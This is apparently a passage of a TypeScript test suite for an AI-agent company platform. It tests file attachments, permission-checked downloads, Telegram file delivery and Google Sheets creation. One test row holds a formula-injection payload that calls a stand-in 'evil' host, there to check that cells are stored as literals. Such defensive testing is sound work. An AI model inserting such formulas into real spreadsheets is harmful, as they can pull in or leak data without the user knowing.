import { createVerify, generateKeyPairSync, randomUUID } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { and, eq } from 'drizzle-orm';
import Fastify from 'fastify';
import { describe, expect, it, onTestFinished } from 'vitest';
import { HIDDEN } from '../src/db/agent-sql.js';
import { agentEvents, agents, companies, departments, jobs, people, personAccess, subscriptions, telegramReplies } from '../src/db/schema.js';
import { hashToken } from '../src/crypto/tokens.js';
import { FILE_BYTES } from '../src/modules/tasks/attachments.js';
import { ask, createTask } from '../src/modules/tasks/engine.js';
import { sendDocument, TelegramError } from '../src/modules/telegram/api.js';
import { listenAt } from '../../../test-support/ports.mjs';
import { fakeTelegram, type TelegramUser } from './fake-telegram.js';
import { as, connectNode, invitePerson, listen, mcp, nextOf, setUpCompany, testApp, until } from './helpers.js';

const NODE_KEY = 'k'.repeat(40);
const BOT_TOKEN = '123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ';
const ORCHESTRATOR_BOT_TOKEN = '987654321:BBHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ';
const CEO_TG: TelegramUser = { id: 7770001, first_name: 'Ivan', username: 'ivan_ceo', language_code: 'ru' };
const MKT_TG: TelegramUser = { id: 7770002, first_name: 'Clara', username: 'clara_mkt', language_code: 'ru' };
const SALES_TG: TelegramUser = { id: 7770003, first_name: 'Sam', username: 'sam_sales', language_code: 'en' };

type ToolReply = { content: { type: string; text: string }[]; isError?: boolean };

const SAMPLE_XLSX = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x61, 0x62, 0x63, 0x64]);
const SAMPLE_CSV = Buffer.from('Name,Email\r\nAda,ada@example.com\r\n', 'utf8');

async function fakeGoogle() {
  const { privateKey, publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const pem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
  const tokenCalls: { assertion: string; grantType: string }[] = [];
  const createdSheets: Record<string, unknown>[] = [];
  const sharedPermissions: { fileId: string; auth: string; body: Record<string, unknown> }[] = [];

  const app = Fastify({ forceCloseConnections: true });
  app.addContentTypeParser('application/x-www-form-urlencoded', { parseAs: 'string' }, (_req, body, done) => done(null, body));

  app.post('/token', async (req, reply) => {
    const params = new URLSearchParams(String(req.body ?? ''));
    const grantType = params.get('grant_type') ?? '';
    const assertion = params.get('assertion') ?? '';
    tokenCalls.push({ assertion, grantType });
    /* An OAuth key answers for itself; Google refuses a refresh token it took back. */
    if (grantType === 'refresh_token') {
      if (params.get('refresh_token') !== 'refresh-good') return reply.code(400).send({ error: 'invalid_grant' });
      return { access_token: 'ya29.fake-google-token-secret', expires_in: 3600, token_type: 'Bearer' };
    }
    const parts = assertion.split('.');
    if (parts.length !== 3) return reply.code(400).send({ error: 'invalid_grant' });
    const verify = createVerify('RSA-SHA256');
    verify.update(`${parts[0]}.${parts[1]}`);
    verify.end();
    const ok = verify.verify(publicKey, Buffer.from(parts[2]!, 'base64url'));
    if (!ok) return reply.code(401).send({ error: 'invalid_signature' });
    return { access_token: 'ya29.fake-google-token-secret', expires_in: 3600, token_type: 'Bearer' };
  });

  app.post('/v4/spreadsheets', async (req, reply) => {
    if (req.headers.authorization !== 'Bearer ya29.fake-google-token-secret') {
      return reply.code(401).send({ error: { message: 'Unauthenticated' } });
    }
    const body = (req.body ?? {}) as Record<string, unknown>;
    createdSheets.push(body);
    const id = `sheet-${createdSheets.length}`;
    return {
      spreadsheetId: id,
      spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${id}/edit`,
    };
  });

  app.post<{ Params: { id: string } }>('/drive/v3/files/:id/permissions', async (req, reply) => {
    sharedPermissions.push({
      fileId: req.params.id,
      auth: String(req.headers.authorization ?? ''),
      body: (req.body ?? {}) as Record<string, unknown>,
    });
    return reply.code(200).send({ id: 'perm-1' });
  });

  await listenAt(port => app.listen({ host: '127.0.0.1', port }));
  const base = `http://127.0.0.1:${(app.server.address() as AddressInfo).port}`;
  onTestFinished(() => app.close());

  const serviceAccountJson = JSON.stringify({
    type: 'service_account',
    project_id: 'acme-sheets',
    private_key_id: 'keyid9876',
    private_key: pem,
    client_email: 'sheets-bot@acme-sheets.iam.gserviceaccount.com',
  });

  return { base, serviceAccountJson, tokenCalls, createdSheets, sharedPermissions };
}

async function marketingCompany(extraEnv: NodeJS.ProcessEnv = {}) {
  const tg = await fakeTelegram();
  tg.bots.set(BOT_TOKEN, { id: 123456789, username: 'acme_mkt_bot', first_name: 'Marketing Bot' });
  const { app, db } = await testApp({ NODE_KEY, TELEGRAM_API_URL: tg.url, ...extraEnv });
  const wsUrl = await listen(app);
  const ceoSession = await setUpCompany(app);
  const node = await connectNode(wsUrl, NODE_KEY);
  node.send({ type: 'hello', version: '0.5.0', loggedIn: true, running: [], terminals: true });
  await until(async () => (await app.inject({ url: '/api/agents/orchestrator/events', ...as(ceoSession) })).json().state.ready);

  const [acme] = await db.select().from(companies);
  const companyId = acme!.id;
  const [ceo] = await db.select().from(people).where(eq(people.isOwner, true));
  const [sub] = await db.select().from(subscriptions);
  const [mkt, sales] = await db
    .insert(departments)
    .values([
      { companyId, templateKey: 'marketing', roleCode: 'MKT', position: 1 },
      { companyId, templateKey: 'sales', roleCode: 'SAL', position: 2 },
    ])
    .returning();

  const [mktHead, mktSeo, salesWorker] = await db
    .insert(agents)
    .values([
      { companyId, kind: 'head', name: 'Mira', roleKey: 'MKT-HEAD', departmentId: mkt!.id, model: '', subscriptionId: sub!.id },
      { companyId, kind: 'worker', name: 'Nora', roleKey: 'MKT-SEO', departmentId: mkt!.id, model: '', subscriptionId: sub!.id },
      { companyId, kind: 'worker', name: 'Sammy', roleKey: 'SAL-AE', departmentId: sales!.id, model: '', subscriptionId: sub!.id },
    ])
    .returning();

  const claraSession = await invitePerson(app, ceoSession, { name: 'Clara', email: 'clara@acme.test', access: { departments: [mkt!.id] } });
  const samSession = await invitePerson(app, ceoSession, { name: 'Sam', email: 'sam@acme.test', access: { departments: [sales!.id] } });
  const [clara] = await db.select().from(people).where(eq(people.email, 'clara@acme.test'));
  const [sam] = await db.select().from(people).where(eq(people.email, 'sam@acme.test'));

  await db.update(people).set({ telegramUsername: 'ivan_ceo', telegramUserId: CEO_TG.id }).where(eq(people.id, ceo!.id));
  await db.update(people).set({ telegramUsername: 'clara_mkt', telegramUserId: MKT_TG.id }).where(eq(people.id, clara!.id));
  await db.update(people).set({ telegramUsername: 'sam_sales', telegramUserId: SALES_TG.id }).where(eq(people.id, sam!.id));

  expect((await app.inject({ method: 'PUT', url: `/api/agents/${mktHead!.id}/telegram`, payload: { token: BOT_TOKEN }, ...as(ceoSession) })).statusCode).toBe(200);

  const task = (
    await createTask(app.ctx, { agentId: mktHead!.id }, {
      title: 'Собрать контакты партнеров в таблицу',
      brief: 'Выдать таблицу контактов',
      body: 'Собери контакты и отдай таблицей.',
      departmentId: mkt!.id,
      assigneeAgentId: mktSeo!.id,
      executor: true,
    })
  ).task;

  let seq = 0;
  const startTurn = async (agentId: string) => {
    const token = `turn-tool-token-${++seq}-0123456789abcdef`;
    const [job] = await db
      .insert(jobs)
      .values({
        companyId,
        subscriptionId: sub!.id,
        agentId,
        kind: 'conversation',
        prompt: 'deliver spreadsheet',
        timeoutMs: 900_000,
        status: 'running',
        startedAt: new Date(),
        toolTokenHash: hashToken(token),
      })
      .returning();
    return { token, job: job! };
  };

  return {
    tg,
    app,
    db,
    node,
    companyId,
    ceo: ceo!,
    ceoSession,
    clara: clara!,
    claraSession,
    sam: sam!,
    samSession,
    mkt: mkt!,
    sales: sales!,
    mktHead: mktHead!,
    mktSeo: mktSeo!,
    salesWorker: salesWorker!,
    task,
    startTurn,
  };
}

describe('1a. task and chat .xlsx/.csv attachments and strict download boundaries', () => {
  it('attaches .xlsx and .csv to a task and to chat, records chat file events, serves 1-click downloads, and blocks unauthorized viewers', async () => {
    const c = await marketingCompany();
    const { token, job } = await c.startTurn(c.mktSeo.id);

    /* Attach .xlsx to both the task and the chat reply. */
    const upBoth = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&chat=1&name=${encodeURIComponent('контакты партнеров.xlsx')}`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(upBoth.statusCode).toBe(201);
    const xlsxId = upBoth.json().id as string;
    expect(upBoth.json().name).toBe('контакты партнеров.xlsx');

    /* Attach .csv directly to chat without a task. */
    const upChatCsv = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?chat=1&name=leads.csv`,
      payload: SAMPLE_CSV,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(upChatCsv.statusCode).toBe(201);
    const csvId = upChatCsv.json().id as string;

    /* Chat events hold the attached files as downloadable file entries. */
    const events = await c.db.select().from(agentEvents).where(eq(agentEvents.jobId, job.id));
    const attachedIds = events.flatMap(e => ((e.data as { pictures?: { id: string; name: string; file?: boolean }[] }).pictures ?? []));
    expect(attachedIds).toEqual([
      { id: xlsxId, name: 'контакты партнеров.xlsx', file: true },
      { id: csvId, name: 'leads.csv', file: true },
    ]);

    /* Authorized viewers (CEO and Marketing member Clara) download both files with Content-Disposition: attachment. */
    for (const session of [c.ceoSession, c.claraSession]) {
      const gotXlsx = await c.app.inject({ url: `/api/attachments/${xlsxId}`, ...as(session) });
      expect(gotXlsx.statusCode).toBe(200);
      expect(gotXlsx.headers['content-disposition']).toContain("attachment; filename*=UTF-8''");
      expect(decodeURIComponent(String(gotXlsx.headers['content-disposition']).split("''")[1]!)).toBe('контакты партнеров.xlsx');
      expect(Buffer.compare(gotXlsx.rawPayload, SAMPLE_XLSX)).toBe(0);

      const gotCsv = await c.app.inject({ url: `/api/attachments/${csvId}`, ...as(session) });
      expect(gotCsv.statusCode).toBe(200);
      expect(gotCsv.headers['content-disposition']).toContain("attachment; filename*=UTF-8''leads.csv");
      expect(Buffer.compare(gotCsv.rawPayload, SAMPLE_CSV)).toBe(0);
    }

    /* Sales-only viewer Sam gets 404 for both Marketing's task file and Marketing's chat file. */
    expect((await c.app.inject({ url: `/api/attachments/${xlsxId}`, ...as(c.samSession) })).statusCode).toBe(404);
    expect((await c.app.inject({ url: `/api/attachments/${csvId}`, ...as(c.samSession) })).statusCode).toBe(404);

    /* Chat file cannot be misused as an ask_person screenshot, and unbound ask_person PNG stays 404 until bound. */
    await expect(ask(c.app.ctx, c.mktSeo.id, c.task.id, { kind: 'question', text: 'Pick?', images: [csvId] })).rejects.toThrow();
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
    const unboundPng = await c.app.inject({
      method: 'POST',
      url: '/api/attachments',
      payload: png,
      headers: { 'content-type': 'image/png', authorization: `Bearer ${token}` },
    });
    expect(unboundPng.statusCode).toBe(201);
    expect((await c.app.inject({ url: `/api/attachments/${unboundPng.json().id as string}`, ...as(c.ceoSession) })).statusCode).toBe(404);
  });
});

describe('1b. Telegram sendDocument delivery and recipient access boundaries', () => {
  it('sends documents through sendDocument and scrubs bot tokens from Telegram errors', async () => {
    const tg = await fakeTelegram();
    tg.bots.set(BOT_TOKEN, { id: 123456789, username: 'doc_bot', first_name: 'Doc Bot' });
    await sendDocument(tg.url, BOT_TOKEN, CEO_TG.id, { bytes: SAMPLE_XLSX, name: 'contacts.xlsx' }, 'Готовая таблица');
    expect(tg.sentDocuments).toHaveLength(1);
    expect(tg.sentDocuments[0]).toMatchObject({
      token: BOT_TOKEN,
      chat_id: CEO_TG.id,
      file_name: 'contacts.xlsx',
      caption: 'Готовая таблица',
    });
    expect(Buffer.compare(tg.sentDocuments[0]!.bytes, SAMPLE_XLSX)).toBe(0);

    tg.blocked.add(999999);
    let caught: unknown;
    try {
      await sendDocument(tg.url, BOT_TOKEN, 999999, { bytes: SAMPLE_XLSX, name: 'contacts.xlsx' });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(TelegramError);
    expect((caught as Error).message).not.toContain(BOT_TOKEN);
    expect((caught as Error).message).toContain('[token]');
  });

  it('delivers chat-attached files via Telegram sendDocument only to the turn author and drops delivery if access is revoked', async () => {
    const c = await marketingCompany();

    /* CEO asks Marketing Head in Telegram for a spreadsheet. */
    c.tg.write(BOT_TOKEN, CEO_TG, 'Пришли контакты файлом xlsx');
    const first = await nextOf(c.node, 'job.run');
    const token = first.toolToken ?? '';
    expect(token.length).toBeGreaterThan(10);
    c.node.send({ type: 'job.started', jobId: first.jobId });
    await until(async () => (await c.db.select().from(telegramReplies)).length === 1);

    const attached = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?chat=1&name=contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(attached.statusCode).toBe(201);
    c.node.send({ type: 'job.event', jobId: first.jobId, seq: 0, event: { kind: 'text', text: 'Отправляю таблицу контактов.' } });

    await until(() => c.tg.sentDocuments.filter(d => d.chat_id === CEO_TG.id).length === 1);
    await until(() => c.tg.sent.filter(s => s.chat_id === CEO_TG.id).length === 1);
    expect(c.tg.sentDocuments.filter(d => d.chat_id === MKT_TG.id)).toHaveLength(0);
    expect(c.tg.sentDocuments[0]!.file_name).toBe('contacts.xlsx');
    expect(Buffer.compare(c.tg.sentDocuments[0]!.bytes, SAMPLE_XLSX)).toBe(0);
    c.node.send({ type: 'job.done', jobId: first.jobId, ok: true, sessionId: 's1', result: '', tail: '', error: null });
    await until(() => c.node.acks.includes(first.jobId));

    /* Clara writes to Marketing Head, then her Marketing access is revoked before the agent replies with a file: she gets nothing. */
    c.tg.write(BOT_TOKEN, MKT_TG, 'Пришли и мне таблицу');
    const second = await nextOf(c.node, 'job.run');
    const secondToken = second.toolToken ?? '';
    c.node.send({ type: 'job.started', jobId: second.jobId });
    await until(async () => (await c.db.select().from(telegramReplies).where(eq(telegramReplies.chatId, MKT_TG.id))).length === 1);

    /* Move Clara's access from Marketing to Sales only before the agent sends the file. */
    await c.db.delete(personAccess).where(and(eq(personAccess.personId, c.clara.id), eq(personAccess.departmentId, c.mkt.id)));
    await c.db.insert(personAccess).values({ companyId: c.companyId, personId: c.clara.id, departmentId: c.sales.id });

    await c.app.inject({
      method: 'POST',
      url: `/api/attachments?chat=1&name=secret-mkt.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${secondToken}` },
    });
    c.node.send({ type: 'job.event', jobId: second.jobId, seq: 0, event: { kind: 'text', text: 'Секретный отчет.' } });
    await until(async () => (await c.db.select().from(telegramReplies).where(eq(telegramReplies.chatId, MKT_TG.id))).length === 0);
    expect(c.tg.sentDocuments.filter(d => d.chat_id === MKT_TG.id)).toHaveLength(0);
    expect(c.tg.sent.filter(s => s.chat_id === MKT_TG.id)).toHaveLength(0);
  });

  it('lets a Marketing worker without its own bot send a task .xlsx via send_telegram_file only to people allowed to see it', async () => {
    const c = await marketingCompany();
    const { token } = await c.startTurn(c.mktSeo.id);
    const up = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&name=partner-contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    const attachmentId = up.json().id as string;
    const client = await mcp(c.app, token);

    /* Authorized CEO receives the file via the Marketing department bot. */
    const sentOk = (await client.callTool({
      name: 'send_telegram_file',
      arguments: { person: c.ceo.id, attachment: attachmentId, caption: 'Контакты партнеров' },
    })) as ToolReply;
    expect(sentOk.isError).toBeFalsy();
    expect(c.tg.sentDocuments).toHaveLength(1);
    expect(c.tg.sentDocuments[0]).toMatchObject({
      chat_id: CEO_TG.id,
      file_name: 'partner-contacts.xlsx',
      caption: 'Контакты партнеров',
    });

    /* Unauthorized Sales-only Sam is refused and receives zero Telegram documents. */
    const refused = (await client.callTool({
      name: 'send_telegram_file',
      arguments: { person: c.sam.id, attachment: attachmentId },
    })) as ToolReply;
    expect(refused.isError).toBe(true);
    expect(c.tg.sentDocuments).toHaveLength(1);
  });
});

describe('1b. a file to a person who connected Telegram through another bot', () => {
  /* The CEO connected Telegram by writing to the orchestrator's bot and never wrote to the Marketing bot, which Telegram then
     does not let write to them. */
  async function upload(c: Awaited<ReturnType<typeof marketingCompany>>) {
    const { token } = await c.startTurn(c.mktSeo.id);
    const up = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&name=partner-contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(up.statusCode).toBe(201);
    return { client: await mcp(c.app, token), attachment: up.json().id as string };
  }

  it('goes through the next bot the person may see when they never started the department bot', async () => {
    const c = await marketingCompany();
    const [orchestrator] = await c.db.select().from(agents).where(and(eq(agents.companyId, c.companyId), eq(agents.kind, 'orchestrator')));
    c.tg.bots.set(ORCHESTRATOR_BOT_TOKEN, { id: 987654321, username: 'acme_orchestrator_bot', first_name: 'Orchestrator' });
    const connected = await c.app.inject({ method: 'PUT', url: `/api/agents/${orchestrator!.id}/telegram`, payload: { token: ORCHESTRATOR_BOT_TOKEN }, ...as(c.ceoSession) });
    expect(connected.statusCode).toBe(200);
    c.tg.strangers.add(`${BOT_TOKEN}:${CEO_TG.id}`);
    const { client, attachment } = await upload(c);

    const sent = (await client.callTool({ name: 'send_telegram_file', arguments: { person: c.ceo.id, attachment } })) as ToolReply;

    expect(sent.isError).toBeFalsy();
    expect(c.tg.sentDocuments.map(d => ({ token: d.token, chat_id: d.chat_id, file_name: d.file_name }))).toEqual([
      { token: ORCHESTRATOR_BOT_TOKEN, chat_id: CEO_TG.id, file_name: 'partner-contacts.xlsx' },
    ]);
  });

  it('names the bot the person has to write to once when no bot they may see can write to them', async () => {
    const c = await marketingCompany();
    c.tg.strangers.add(`${BOT_TOKEN}:${CEO_TG.id}`);
    const { client, attachment } = await upload(c);

    const refused = (await client.callTool({ name: 'send_telegram_file', arguments: { person: c.ceo.id, attachment } })) as ToolReply;

    expect(refused.isError).toBe(true);
    expect(refused.content[0]!.text).toContain('@acme_mkt_bot');
    expect(refused.content[0]!.text).toContain('hh-attach');
    expect(refused.content[0]!.text).not.toContain(BOT_TOKEN);
    expect(c.tg.sentDocuments).toHaveLength(0);
  });
});

describe('1c. Google Sheets integration and clear .xlsx fallback when Google is not connected', () => {
  it('saves Google Sheets credentials only for whole-company admins, hides google_sheets from agent SQL, creates sheets, and instructs .xlsx fallback when disconnected', async () => {
    const google = await fakeGoogle();
    const c = await marketingCompany({
      GOOGLE_TOKEN_URL: `${google.base}/token`,
      GOOGLE_SHEETS_URL: google.base,
      GOOGLE_DRIVE_URL: google.base,
    });

    expect(HIDDEN).toContain('google_sheets');

    /* Department-only people cannot read or change company Google Sheets settings. */
    expect((await c.app.inject({ url: '/api/google-sheets', ...as(c.claraSession) })).statusCode).toBe(403);
    expect(
      (
        await c.app.inject({
          method: 'PUT',
          url: '/api/google-sheets',
          payload: { credentials: google.serviceAccountJson },
          ...as(c.claraSession),
        })
      ).statusCode,
    ).toBe(403);

    /* Before Google is connected, create_google_sheet tells the Marketing agent what to connect and requires immediate .xlsx fallback. */
    const { token } = await c.startTurn(c.mktSeo.id);
    const client = await mcp(c.app, token);
    const fallback = (await client.callTool({
      name: 'create_google_sheet',
      arguments: {
        title: 'Partner Contacts',
        sheets: [{ name: 'Contacts', headers: ['Company', 'Email'], rows: [['North LLC', 'hi@north.test']] }],
      },
    })) as ToolReply;
    expect(fallback.isError).toBeFalsy();
    const fallbackData = JSON.parse(fallback.content[0]!.text) as { connected: boolean; setup: string; fallback: string };
    expect(fallbackData.connected).toBe(false);
    expect(fallbackData.setup).toContain('Settings -> Integrations -> Google Sheets');
    expect(fallbackData.fallback).toContain('hh-xlsx');
    expect(fallbackData.fallback).toContain('hh-attach');

    /* CEO connects Google Sheets in Settings, under Integrations; raw private key is never returned. */
    const saved = await c.app.inject({
      method: 'PUT',
      url: '/api/google-sheets',
      payload: { credentials: google.serviceAccountJson, shareEmail: 'ivan@acme.test' },
      ...as(c.ceoSession),
    });
    expect(saved.statusCode).toBe(200);
    expect(saved.body).not.toContain('BEGIN PRIVATE KEY');
    expect(saved.json()).toEqual({
      google: {
        kind: 'service_account',
        account: 'sheets-bot@acme-sheets.iam.gserviceaccount.com',
        shareEmail: 'ivan@acme.test',
        keyLast4: '9876',
      },
    });

    /* Updating shareEmail without re-sending credentials keeps the encrypted key. */
    const updated = await c.app.inject({
      method: 'PUT',
      url: '/api/google-sheets',
      payload: { shareEmail: 'ceo@acme.test' },
      ...as(c.ceoSession),
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.json().google.shareEmail).toBe('ceo@acme.test');

    /* Connected create_google_sheet creates a populated workbook with literal cells (no formula injection) and shares with shareEmail. */
    const created = (await client.callTool({
      name: 'create_google_sheet',
      arguments: {
        title: 'Контакты партнеров 2026',
        sheets: [
          {
            name: 'Партнеры',
            headers: ['Компания', 'Почта', 'Сделок', 'Формула'],
            rows: [['Север', 'info@sever.test', 5, '=IMPORTXML("http://evil","//a")']],
          },
        ],
      },
    })) as ToolReply;
    expect(created.isError).toBeFalsy();
    const createdData = JSON.parse(created.content[0]!.text) as { connected: boolean; spreadsheetId: string; url: string };
    expect(createdData).toMatchObject({
      connected: true,
      spreadsheetId: 'sheet-1',
      url: 'https://docs.google.com/spreadsheets/d/sheet-1/edit',
    });
    expect(google.tokenCalls).toHaveLength(1);
    expect(google.createdSheets).toHaveLength(1);
    expect(JSON.stringify(google.createdSheets[0])).toContain('"stringValue":"=IMPORTXML(\\"http://evil\\",\\"//a\\")"');
    expect(JSON.stringify(google.createdSheets[0])).not.toContain('formulaValue');
    expect(google.sharedPermissions).toEqual([
      {
        fileId: 'sheet-1',
        auth: 'Bearer ya29.fake-google-token-secret',
        body: { type: 'user', role: 'writer', emailAddress: 'ceo@acme.test' },
      },
    ]);

    /* Deleting disconnects Google Sheets. */
    expect((await c.app.inject({ method: 'DELETE', url: '/api/google-sheets', ...as(c.ceoSession) })).statusCode).toBe(204);
    expect((await c.app.inject({ url: '/api/google-sheets', ...as(c.ceoSession) })).json()).toEqual({ google: null });
  });
});

describe('1c. a Google key whose spreadsheets a person can open', () => {
  it('takes a service account key only with the Google account its spreadsheets are shared with, and an OAuth key without one', async () => {
    const google = await fakeGoogle();
    const c = await marketingCompany();
    const put = (payload: Record<string, unknown>) => c.app.inject({ method: 'PUT', url: '/api/google-sheets', payload, ...as(c.ceoSession) });
    const shown = async () => (await c.app.inject({ url: '/api/google-sheets', ...as(c.ceoSession) })).json().google;

    /* A service account owns what it creates and opens it to no one else: its links would open for nobody. */
    const bare = await put({ credentials: google.serviceAccountJson });
    expect(bare.statusCode).toBe(400);
    expect(bare.json().error.reason).toBe('google_sheets_share_needed');
    expect(await shown()).toBeNull();

    expect((await put({ credentials: google.serviceAccountJson, shareEmail: 'ivan@acme.test' })).statusCode).toBe(200);
    const cleared = await put({ shareEmail: null });
    expect(cleared.statusCode).toBe(400);
    expect(cleared.json().error.reason).toBe('google_sheets_share_needed');
    expect((await shown()).shareEmail).toBe('ivan@acme.test');

    /* What an OAuth key creates belongs to its own Google account, which opens it. */
    const oauth = await put({
      credentials: JSON.stringify({ client_id: 'cid.apps.googleusercontent.com', client_secret: 'client-secret', refresh_token: '1//refresh-token-abcd', account: 'owner@acme.test' }),
      shareEmail: null,
    });
    expect(oauth.statusCode).toBe(200);
    expect(oauth.json().google).toEqual({ kind: 'oauth', account: 'owner@acme.test', shareEmail: null, keyLast4: 'abcd' });
  });
});

describe('the edges of a table delivered to a person', () => {
  const oauthKey = (refreshToken: string, account?: string) =>
    JSON.stringify({ client_id: 'cid.apps.googleusercontent.com', client_secret: 'client-secret', refresh_token: refreshToken, ...(account ? { account } : {}) });

  it('refuses a Google key it cannot use, says so in plain words, and keeps none of it', async () => {
    const google = await fakeGoogle();
    const c = await marketingCompany();
    const put = (payload: Record<string, unknown>) => c.app.inject({ method: 'PUT', url: '/api/google-sheets', payload, ...as(c.ceoSession) });
    const shown = async () => (await c.app.inject({ url: '/api/google-sheets', ...as(c.ceoSession) })).json().google;
    const unusable = [
      'not json',
      '["a list"]',
      JSON.stringify({ type: 'service_account', client_email: 'bot@acme.test' }),
      JSON.stringify({ type: 'service_account', client_email: 'bot@acme.test', private_key: 'not a key' }),
      JSON.stringify({ client_id: 'cid.apps.googleusercontent.com', client_secret: 'client-secret' }),
    ];
    for (const credentials of unusable) {
      const refused = await put({ credentials, shareEmail: 'ivan@acme.test' });
      expect(refused.statusCode, credentials).toBe(400);
      expect(refused.json().error.reason, credentials).toBe('google_sheets_invalid');
    }
    const badEmail = await put({ credentials: google.serviceAccountJson, shareEmail: 'not an email' });
    expect(badEmail.json().error.reason).toBe('google_sheets_invalid');
    expect(await shown()).toBeNull();

    /* A key without its id is known by the end of the key itself; an OAuth key without its account by its client. */
    const withoutId = JSON.parse(google.serviceAccountJson) as Record<string, string>;
    delete withoutId.private_key_id;
    const saved = await put({ credentials: JSON.stringify(withoutId), shareEmail: 'ivan@acme.test' });
    expect(saved.statusCode).toBe(200);
    expect(saved.json().google.keyLast4).toMatch(/^[A-Za-z0-9]{4}$/);
    expect(saved.body).not.toContain('PRIVATE KEY');
    const oauth = await put({ credentials: oauthKey('refresh-good') });
    expect(oauth.json().google).toMatchObject({ kind: 'oauth', account: 'cid.apps.googleusercontent.com', keyLast4: 'good' });
  });

  it('creates a spreadsheet with an OAuth key, and on Google refusing tells the agent to attach the .xlsx', async () => {
    const google = await fakeGoogle();
    const c = await marketingCompany({ GOOGLE_TOKEN_URL: `${google.base}/token`, GOOGLE_SHEETS_URL: google.base, GOOGLE_DRIVE_URL: google.base });
    const put = (payload: Record<string, unknown>) => c.app.inject({ method: 'PUT', url: '/api/google-sheets', payload, ...as(c.ceoSession) });
    const { token } = await c.startTurn(c.mktSeo.id);
    const client = await mcp(c.app, token);
    const create = async () => (await client.callTool({ name: 'create_google_sheet', arguments: { title: 'Leads', sheets: [{ rows: [['North LLC', 3]] }] } })) as ToolReply;

    expect((await put({ credentials: oauthKey('refresh-good', 'owner@acme.test') })).statusCode).toBe(200);
    const created = await create();
    expect(created.isError).toBeFalsy();
    expect(JSON.parse(created.content[0]!.text)).toMatchObject({ connected: true, url: 'https://docs.google.com/spreadsheets/d/sheet-1/edit' });
    expect(google.tokenCalls.map(call => call.grantType)).toEqual(['refresh_token']);
    /* What an OAuth key creates is its own account's: it is shared with no one else, and a sheet without a name is Sheet1. */
    expect(google.sharedPermissions).toEqual([]);
    expect(google.createdSheets[0]).toMatchObject({ sheets: [{ properties: { title: 'Sheet1' } }] });

    expect((await put({ credentials: oauthKey('refresh-revoked', 'owner@acme.test') })).statusCode).toBe(200);
    const refused = await create();
    expect(refused.isError).toBe(true);
    expect(refused.content[0]!.text).toContain('invalid_grant');
    expect(refused.content[0]!.text).toContain('hh-xlsx');
    expect(google.createdSheets).toHaveLength(1);
  });

  it('finds the person by their exact name and sends nothing a person may not see or cannot get', async () => {
    const c = await marketingCompany();
    const { token } = await c.startTurn(c.mktSeo.id);
    const up = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&name=partner-contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    const attachment = up.json().id as string;
    /* A Sales agent's chat file: Clara works in Marketing and may not see it, the CEO sees the whole company. */
    const sales = await c.startTurn(c.salesWorker.id);
    const salesFile = await c.app.inject({
      method: 'POST',
      url: '/api/attachments?chat=1&name=sales-pipeline.xlsx',
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${sales.token}` },
    });
    const client = await mcp(c.app, token);
    const send = async (args: Record<string, unknown>) => (await client.callTool({ name: 'send_telegram_file', arguments: args })) as ToolReply;
    const said = (reply: ToolReply) => ({ isError: reply.isError ?? false, text: reply.content[0]!.text });

    expect(said(await send({ person: 'Clara', attachment })).isError).toBe(false);
    expect(c.tg.sentDocuments.map(d => d.chat_id)).toEqual([MKT_TG.id]);

    expect(said(await send({ person: 'Nobody', attachment }))).toEqual({ isError: true, text: 'There is no active person named "Nobody" in this company.' });
    expect(said(await send({ person: randomUUID(), attachment }))).toEqual({ isError: true, text: 'There is no active person with that id in this company.' });
    expect(said(await send({ person: c.clara.id, attachment: randomUUID() }))).toEqual({ isError: true, text: 'That file does not exist or that person is not allowed to see it.' });
    expect(said(await send({ person: c.clara.id, attachment: salesFile.json().id }))).toEqual({ isError: true, text: 'That file does not exist or that person is not allowed to see it.' });
    /* The CEO sees the Sales file, but its sender still may not read or forward it. */
    expect(said(await send({ person: c.ceo.id, attachment: salesFile.json().id }))).toEqual({ isError: true, text: 'That file does not exist or that person is not allowed to see it.' });
    expect(said(await send({ person: c.ceo.id, attachment })).isError).toBe(false);

    await invitePerson(c.app, c.ceoSession, { name: 'Clara', email: 'clara.two@acme.test', access: { departments: [c.mkt.id] } });
    expect(said(await send({ person: 'Clara', attachment })).text).toContain('More than one person is named "Clara"');
    await c.db.update(people).set({ telegramUserId: null }).where(eq(people.id, c.clara.id));
    expect(said(await send({ person: c.clara.id, attachment })).text).toBe('Clara has not connected Telegram yet. Attach the file to the task or chat with hh-attach instead.');
    expect(c.tg.sentDocuments.map(d => d.chat_id)).toEqual([MKT_TG.id, CEO_TG.id]);
  });

